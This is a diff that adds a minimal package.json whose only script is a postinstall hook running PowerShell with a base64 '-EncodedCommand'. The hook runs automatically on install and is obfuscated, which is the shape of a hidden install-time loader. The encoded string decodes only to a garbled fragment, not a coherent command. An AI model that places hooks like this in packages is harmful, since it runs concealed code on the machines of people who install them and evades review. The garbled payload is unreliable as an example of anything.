@@ -1,0 +1,6 @@
+{
+  "name": "x",
+  "scripts": {
+    "postinstall": "powershell -EncodedCommand aQBmAC0AUwBlAHIAdgBpAGMAZQBlAHIA"
+  }
+}
